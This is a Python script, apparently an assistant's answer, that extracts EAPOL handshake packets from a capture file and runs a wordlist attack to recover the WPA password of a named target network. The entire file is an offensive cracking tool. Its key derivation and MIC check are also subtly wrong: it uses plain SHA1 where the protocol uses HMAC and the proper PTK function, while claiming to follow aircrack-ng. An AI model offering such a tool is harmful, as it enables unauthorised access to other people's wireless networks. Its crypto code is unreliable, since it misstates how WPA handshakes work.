import hashlib
from scapy.all import rdpcap, EAPOL
from Crypto.Protocol.KDF import PBKDF2

# Function to extract the handshake from the .cap file
def extract_handshake(pcap_file):
    packets = rdpcap(pcap_file)
    eapol_packets = []

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_packets.append(packet)
    
    # Handle 3 EAPOL packets (as in your case)
    if len(eapol_packets) >= 3:
        return eapol_packets
    else:
        raise ValueError(f"Not enough EAPOL packets found. Found {len(eapol_packets)} instead of 3.")

# Function to derive the PSK from password using PBKDF2
def derive_psk(password, ssid):
    ssid_bytes = ssid.encode('utf-8')
    password_bytes = password.encode('utf-8')
    
    # PBKDF2-HMAC-SHA1 to derive the 256-bit PSK (32-byte key)
    psk = PBKDF2(password_bytes, ssid_bytes, dkLen=32, count=4096, prf=lambda p, s: hashlib.sha1(p + s).digest())
    return psk

# Function to derive the master key and transient keys using PBKDF2
def derive_keys(psk, key_nonce, key_iv):
    # The master key and transient key derivation as per aircrack-ng process
    master_key = hashlib.sha1(psk + key_nonce + key_iv).digest()
    transient_key = hashlib.sha1(master_key + key_nonce).digest()
    return master_key, transient_key

# Function to verify the password by checking the MIC (Message Integrity Code)
def verify_password(handshake, password, ssid):
    # Handle 3 EAPOL packets, extract the MIC from the last packet (third packet in this case)
    if len(handshake) < 3:
        raise ValueError("The handshake is incomplete, not enough EAPOL packets to verify the password.")
    
    # Extract WPA Key MIC and Nonce
    mic = handshake[2].load[-16:]  # WPA Key MIC in the last EAPOL packet (index 2)
    key_nonce = handshake[1].load[13:45]  # WPA Key Nonce from the second EAPOL packet (index 1)
    key_iv = bytes([0] * 16)  # Zeroed Key IV (not relevant in your case as per your input)

    # Derive the PSK using the password and SSID
    psk = derive_psk(password, ssid)

    # Derive Master Key and Transient Key
    master_key, transient_key = derive_keys(psk, key_nonce, key_iv)

    # Create the MIC from the derived PSK
    data_to_hash = handshake[2].load[:-16] + key_nonce + key_iv
    generated_mic = hashlib.sha1(master_key + data_to_hash).digest()[-16:]

    # Compare the generated MIC with the extracted MIC
    return generated_mic == mic

# Function to crack the WPA password using the wordlist
def crack_wpa(pcap_file, ssid, wordlist):
    try:
        # Extract the handshake from the .cap file
        handshake = extract_handshake(pcap_file)
    except ValueError as e:
        print(f"Error: {e}")
        return None

    # Try each password from the wordlist
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            print(f"Trying: {password}")
            try:
                if verify_password(handshake, password, ssid):
                    print(f"Password found: {password}")
                    return password
            except ValueError as e:
                print(f"Verification error: {e}")
                continue

    print("Password not found in the wordlist.")
    return None

# Example usage:
pcap_file = "shak.cap"  # Path to the .cap file containing the WPA handshake
ssid = "PEKLO"          # SSID of the target network
wordlist = "pwd.txt"    # Path to the wordlist file containing potential passwords

# Start the cracking process
crack_wpa(pcap_file, ssid, wordlist)
